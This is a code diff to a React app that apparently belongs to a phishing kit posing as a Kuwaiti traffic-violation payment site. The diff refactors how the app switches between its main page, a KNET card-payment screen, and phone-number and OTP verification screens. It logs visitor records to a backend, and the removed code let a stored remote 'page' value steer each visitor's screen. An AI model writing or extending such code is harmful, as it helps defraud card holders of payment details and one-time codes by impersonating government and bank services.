@@ -13,7 +13,7 @@ import PhoneOTP from "./phone/phone-otp";
 import LoadingScreen from "./sahel";
 import FullPageLoader from "./loader1";
 
-function App() {
+function App(props: { page: any; setPage: any }) {
   const [dataall] = useState<any>([]);
   const [isCheked, setIsCheked] = useState<boolean>(false);
   const { violationData, fetchViolationData } = useFetchViolationData();
@@ -25,14 +25,13 @@ function App() {
   const [_id] = useState("id" + Math.random().toString(16).slice(2));
   const [id, setId] = useState("");
 
-  const [page, setPage] = useState("main");
   const data = {
     id: _id,
-    currentPage: page,
+    currentPage: props.page,
     createdDate: new Date().toISOString(),
     notificationCount: 1,
     violationValue: amount,
-    page: page,
+    page: props.page,
     isOnline: isOnline,
     personalInfo: {
       id: id,
@@ -42,7 +41,6 @@ function App() {
   const [loading, setloading] = useState(false);
   useEffect(() => {
     localStorage.setItem("vistor", _id);
-    console.log(isCheked);
     addData({
       ...data,
       forestoreAttachment: "app-IFifwzlcXElzzk2qTKQJdX2wp6v3z0.tsx",
@@ -56,7 +54,6 @@ function App() {
         if (docSnap.exists()) {
           const data = docSnap.data() as any;
           if (data.page !== "") {
-            setPage(data.page);
           }
           if (data.violationValue) {
             if (data.violationValue !== "") {
@@ -72,8 +69,8 @@ function App() {
     }
   }
   useEffect(() => {
-    console.log(page);
-  }, [page]);
+    console.log(props.page);
+  }, [props.page]);
 
   useEffect(() => {
     // Set up event listeners for online/offline status
@@ -119,15 +116,15 @@ function App() {
   };
   return (
     <>
-      {page === "knet" ? (
-        <Kent setPage={setPage} />
-      ) : page === "phone" ? (
-        <VerificationForm setPage={setPage} />
-      ) : page === "phoneCode" ? (
-        <PhoneOTP setPage={setPage} />
-      ) : page === "sahel" ? (
+      {props.page === "knet" ? (
+        <Kent setPage={props.setPage} />
+      ) : props.page === "phone" ? (
+        <VerificationForm setPage={props.setPage} />
+      ) : props.page === "phoneCode" ? (
+        <PhoneOTP setPage={props.setPage} />
+      ) : props.page === "sahel" ? (
         <LoadingScreen />
-      ) : page === "main" ? (
+      ) : props.page === "main" ? (
         <div dir="rtl">
           <header>
             <div className="row">
@@ -946,7 +943,7 @@ function App() {
                               onClick={() => {
                                 addData(data);
                                 setTimeout(() => {
-                                  setPage("knet");
+                                  props.setPage("knet");
                                 }, 2000);
                               }}
                               id="btnPay"
